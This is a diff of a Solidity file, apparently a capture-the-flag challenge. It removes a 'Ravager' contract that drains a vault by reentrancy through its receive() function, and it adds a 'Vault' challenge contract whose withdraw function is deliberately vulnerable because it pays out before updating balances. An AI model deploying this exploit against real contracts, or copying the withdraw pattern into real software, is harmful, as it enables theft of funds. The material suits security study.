@@ -1,43 +1,33 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.0;
+pragma solidity ^0.6.12;
 pragma experimental ABIEncoderV2;
 
-contract Ravager {
-    address public owner;
-    address public vault;
+contract Vault {
+    mapping(address => uint256) public balances;
 
-    constructor(address vault_) payable {
-        owner = msg.sender;
-        vault = vault_;
+    address public player;
+
+    constructor(address _player) public payable {
+        player = _player;
     }
 
-    function min(uint256 a, uint256 b) private pure returns(uint256) {
-        return a > b ? b : a;
+    function deposit(address _to) public payable {
+        balances[_to] += msg.value;
     }
 
-    function attack() public payable {
-        require(msg.value >= 0.001 ether, "Not enough gas"); // not sure if we need this, remove?
-        // deposit first
-        (bool success,) = vault.call{value: 0.001 ether}(
-            abi.encodeWithSignature("deposit(address)", address(this))
-        );
-        require(success, "Not successfull deposit");
-
-        (success,) = vault.call(
-            abi.encodeWithSignature("withdraw(uint256)", 0.001 ether)
-        );
-        require(success, "Not successfull exploit");
-    }
-
-    receive() external payable {
-        // we will exploit reentrancy here
-        uint256 myBalance = msg.value;
-        if (msg.sender.balance > 0) {
-            uint256 nextWithdraw = min(myBalance, msg.sender.balance);
-            (bool success,) = vault.call(
-                abi.encodeWithSignature("withdraw(uint256)", nextWithdraw)
-            );
-            require(success, "Not successfull reentrancy exploit");
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] >= _amount) {
+            (bool success,) = msg.sender.call{value: _amount}("");
+            require(success, "call failed");
+            balances[msg.sender] -= _amount;
         }
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function isSolved() external view returns (bool) {
+        return address(this).balance == 0;
     }
 }
